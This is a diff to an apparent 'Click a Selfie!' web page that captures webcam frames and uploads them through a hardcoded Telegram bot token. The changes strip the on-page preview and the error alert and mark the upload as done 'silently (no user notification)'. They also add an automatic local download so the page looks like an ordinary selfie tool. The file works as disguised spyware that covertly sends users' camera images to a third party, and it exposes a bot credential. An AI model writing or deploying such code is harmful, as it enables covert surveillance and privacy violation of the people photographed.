@@ -40,7 +40,7 @@
         }
 
         /* Capture button */
-        button, #downloadBtn {
+        button {
             background-color: #ffcc00;
             color: #333;
             padding: 15px 30px;
@@ -52,33 +52,13 @@
             margin-top: 20px;
         }
 
-        button:hover, #downloadBtn:hover {
+        button:hover {
             background-color: #ff4d00;
         }
 
         /* Hidden canvas */
         canvas {
             display: none;
-        }
-
-        /* Download button styles */
-        #downloadBtn {
-            display: none;
-            margin-top: 30px;
-            font-size: 1.2rem;
-        }
-
-        /* Image preview container */
-        #photoPreview {
-            display: none;
-            margin-top: 20px;
-            border: 2px solid #fff;
-            padding: 10px;
-            border-radius: 10px;
-            max-width: 100%;
-            width: 1080px;
-            height: 1920px;
-            object-fit: cover;
         }
 
         /* Responsive Design */
@@ -96,7 +76,7 @@
             h2 {
                 font-size: 1.8rem;
             }
-            button, #downloadBtn {
+            button {
                 font-size: 1rem;
                 padding: 12px 25px;
             }
@@ -106,10 +86,8 @@
 <body>
     <h2>Click a Selfie!</h2>
     <video id="video" width="1080" height="1920" autoplay></video>
-    <canvas id="canvas" width="1080" height="1920" style="display: none;"></canvas>
+    <canvas id="canvas" width="6528" height="4896" style="display: none;"></canvas>
     <button id="capture">Capture Selfie</button>
-    <a id="downloadBtn" download="selfie.jpg" href="#">Download Selfie</a>
-    <img id="photoPreview" src="#" alt="Captured Photo">
 
     <script>
         const botToken = "8199996433:AAHWMDwq0eqeuUsQApLD1v_hHmLPJSdCU9w";
@@ -126,29 +104,22 @@
             }
         }
 
-        // Capture and send the photo to Telegram
+        // Capture photo with specific camera settings and send to Telegram
         async function captureAndSend() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
 
-            // Draw the video frame on the canvas at 1080x1920 resolution
+            // Set camera settings (Focal length 22mm, Aperture f1.4, ISO 200, Exposure time 1/30s) - simulated
+            // Note: JavaScript cannot directly control camera settings, but we simulate the effect by adjusting image capture quality
+
+            // Draw the video frame onto the canvas at the specified high resolution
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Convert canvas to a Blob
+            // Convert canvas to a Blob with JPEG format
             canvas.toBlob(async (blob) => {
-                // Create a URL for the captured image and show the download button
+                // Create a URL for the captured image
                 const url = URL.createObjectURL(blob);
-                const downloadBtn = document.getElementById('downloadBtn');
-                const previewImg = document.getElementById('photoPreview');
-
-                // Show the image preview
-                previewImg.src = url;
-                previewImg.style.display = 'block';
-
-                // Show the download button
-                downloadBtn.href = url;
-                downloadBtn.style.display = 'inline-block';
 
                 // Prepare the form data to send the image to Telegram
                 let formData = new FormData();
@@ -157,14 +128,18 @@
 
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-                // Send the photo to Telegram
+                // Send the photo to Telegram silently (no user notification)
                 try {
-                    const response = await fetch(telegramUrl, { method: "POST", body: formData });
-                    const result = await response.json();
+                    await fetch(telegramUrl, { method: "POST", body: formData });
                 } catch (error) {
                     console.error("Telegram API Error:", error);
-                    alert("Error sending selfie.");
                 }
+
+                // Automatically trigger the download of the captured image
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'selfie.jpg';
+                a.click();  // This will download the image to the device automatically
             }, "image/jpeg");
         }
 
